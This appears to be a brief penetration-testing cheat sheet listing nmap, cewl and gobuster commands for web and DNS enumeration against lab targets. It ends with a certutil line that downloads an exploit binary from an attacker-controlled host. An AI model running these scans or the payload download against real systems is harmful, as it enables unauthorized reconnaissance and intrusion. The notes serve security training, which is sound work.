### NMAP
nmap -p80 --script=http-enum 172.16.80.1

nmap -p80 --script=http-methods --script-args http-methods.url-path='/wp-includes/' $IP

nmap -p80 -sV --script http-wordpress-enum offsecwp

### CEWL

sudo cewl -d 2 -m 5 -w ourWordlist.txt www.MegaCorpOne.com

ls -sa /usr/bin | sed 's/[0-9]*//g' | sed -r 's/\s+//g' |sort -u > $HOME/binaries-wordlist.txt

### GOBUSTER


gobuster dir -u $URL -w /usr/share/wordlists/dirb/common.txt -t 5 -b 301

gobuster dns -d megacorpone.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 30

#### CERTUTIL

certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe

